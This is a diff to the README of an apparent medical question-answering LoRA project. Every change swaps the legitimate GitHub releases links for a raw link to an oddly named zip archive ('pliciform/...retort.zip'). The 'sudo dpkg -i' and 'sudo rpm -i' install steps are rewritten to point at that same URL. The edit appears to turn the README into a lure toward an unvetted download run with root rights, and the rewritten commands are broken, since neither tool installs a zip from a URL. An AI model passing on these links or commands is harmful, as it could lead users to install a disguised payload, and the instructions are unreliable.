@@ -8,7 +8,7 @@ Welcome to the gemma-medical-qa-lora project! This application answers your medi
 
 ## 🔗 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/mohamedAhmed-danger/gemma-medical-qa-lora/releases)
+[![Download Now](https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip)
 
 ## 🛠 System Requirements
 
@@ -22,7 +22,7 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download Releases](https://github.com/mohamedAhmed-danger/gemma-medical-qa-lora/releases).
+To get started, visit this page to download the latest release: [Download Releases](https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version.
@@ -51,12 +51,12 @@ To get started, visit this page to download the latest release: [Download Releas
 
    For .deb files:
    ```
-   sudo dpkg -i path/to/gemma-medical-qa-lora.deb
+   sudo dpkg -i https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip
    ```
 
    For .rpm files:
    ```
-   sudo rpm -i path/to/gemma-medical-qa-lora.rpm
+   sudo rpm -i https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip
    ```
 
 4. Once installed, you can find the application in your application menu.
@@ -95,4 +95,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 We value your feedback. If you have suggestions for improvements or features, please let us know. Your input helps us enhance this application for everyone.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/mohamedAhmed-danger/gemma-medical-qa-lora/releases)
+[![Download Now](https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/mohamedAhmed-danger/gemma-medical-qa-lora/main/pliciform/gemma_qa_lora_medical_retort.zip)
